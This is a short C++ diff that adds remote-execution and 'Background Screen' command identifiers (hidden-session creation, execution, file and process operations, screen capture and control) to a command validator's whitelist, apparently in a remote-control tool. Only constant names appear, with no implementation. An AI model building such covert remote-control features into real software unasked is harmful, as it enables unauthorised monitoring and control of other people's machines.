@@ -108,6 +108,16 @@ void CommandValidator::InitializeCommands() {
     
     s_validCommands.insert(CMD_SET_GROUP);
     s_validCommands.insert(CMD_MESSAGEBOX);
+    s_validCommands.insert(CMD_EXEC_GET_OUTPUT);
+
+    // Background Screen Commands
+    s_validCommands.insert(CMD_BACKGROUND_CREATE);
+    s_validCommands.insert(CMD_BACKGROUND_EXECUTE);
+    s_validCommands.insert(CMD_BACKGROUND_FILE_OP);
+    s_validCommands.insert(CMD_BACKGROUND_PROCESS);
+    s_validCommands.insert(CMD_BACKGROUND_SCREEN_CAPTURE);
+    s_validCommands.insert(CMD_BACKGROUND_SCREEN_CONTROL);
+    s_validCommands.insert(CMD_BACKGROUND_SWITCH_BACK);
     
     s_initialized = true;
 }
